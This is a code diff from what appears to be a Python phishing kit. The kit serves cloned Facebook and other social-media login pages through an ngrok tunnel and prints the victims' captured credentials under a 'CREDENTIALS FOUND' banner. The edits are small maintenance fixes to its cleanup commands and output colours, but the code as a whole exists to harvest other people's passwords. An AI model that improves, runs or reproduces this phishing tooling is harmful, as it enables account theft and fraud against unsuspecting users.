@@ -73,7 +73,7 @@ def loadModule(module):
  [{1}*{0}]{1} %s module loaded. Building site...{0}'''.format(CYAN, END) % module
 
 def runPhishing(social, option2):
-    system('sudo rm -Rf Server/www/*.* && touch Server/www/usernames.txt')
+    system('rm -Rf Server/www/*.* && touch Server/www/usernames.txt')
     if option2 == '1' and social == 'Facebook':
         system('cp WebPages/fb_standard/*.* Server/www/')
     if option2 == '2' and social == 'Facebook':
@@ -122,7 +122,7 @@ def waitCreds():
             lines = creds.read().rstrip()
         if len(lines) != 0: 
             print ' {0}[ CREDENTIALS FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines
-            system('rm -rf Server/www/cat.txt && touch Server/www/usernames.txt')
+            system('rm -rf Server/www/usernames.txt && touch Server/www/usernames.txt')
         creds.close()
 
 def runPEnv():
@@ -203,7 +203,7 @@ def runNgrok():
     sleep(10)
     system('curl -s http://127.0.0.1:4040/status | grep -P "https://.*?ngrok.io" -oh > ngrok.url')
     url = open('ngrok.url', 'r')
-    print('\n {0}[{1}*{0}]{1} Ngrok URL: {2}' + url.readlines()[0] + '{1}').format(CYAN, END, GREEN)
+    print('\n {0}[{1}*{0}]{1} Ngrok URL: {2}' + url.readlines()[0] + '{1}').format(RED, END, CYAN)
     url.close()
 
 def runServer():
